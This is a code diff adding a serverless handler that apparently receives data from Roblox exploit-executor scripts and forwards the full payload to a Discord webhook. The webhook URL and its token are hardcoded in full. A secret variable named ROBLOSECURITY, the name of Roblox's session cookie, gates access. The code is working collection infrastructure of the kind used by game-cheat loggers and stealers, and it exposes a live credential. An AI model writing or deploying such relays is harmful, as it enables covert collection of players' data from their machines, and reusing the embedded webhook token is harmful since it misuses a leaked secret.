@@ -1,0 +1,61 @@
+export default async function handler(req, res) {
+  if (req.method !== 'POST') {
+    return res.status(405).json({ error: 'Method not allowed.' });
+  }
+
+  // 1. Check your process.env for security
+  const serverSecret = process.env.ROBLOSECURITY; 
+  const clientSecret = req.headers['authorization'];
+
+  if (serverSecret && clientSecret !== serverSecret) {
+    return res.status(401).json({ error: 'Unauthorized access.' });
+  }
+
+  const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1512097820012838933/lhu_3wEX2XE63R5A4lqgaYEwZoixepPr8nGT5vm6zif_hBeY3qTZwd-Gc1Nj9-6LjH0Y';
+
+  try {
+    // 2. Parse client data safely
+    let gameData = req.body;
+    if (typeof gameData === 'string') {
+      try {
+        gameData = JSON.parse(gameData);
+      } catch (e) {
+        gameData = { rawText: gameData };
+      }
+    }
+
+    // 3. Pull the Executor name out of the data sent by the client
+    // Default to "Unknown Executor" if the script didn't send one
+    const executorName = gameData.ExecutorUsed || "Unknown Executor";
+
+    // 4. Format the Discord Embed
+    const discordPayload = {
+      // This prints the executor name right at the very top of the Discord message!
+      content: `🚀 **New Execution Detected via: ${executorName}**`,
+      embeds: [
+        {
+          title: "Client Data Log",
+          description: "```json\n" + JSON.stringify(gameData, null, 2) + "\n```",
+          color: 10181046 // Purple color
+        }
+      ]
+    };
+
+    // 5. Send to Discord
+    const discordResponse = await fetch(DISCORD_WEBHOOK_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(discordPayload),
+    });
+
+    if (!discordResponse.ok) {
+      throw new Error(`Discord returned status ${discordResponse.status}`);
+    }
+
+    return res.status(200).json({ success: true, message: 'Data sent successfully!' });
+
+  } catch (error) {
+    console.error(error);
+    return res.status(500).json({ success: false, error: error.message });
+  }
+}
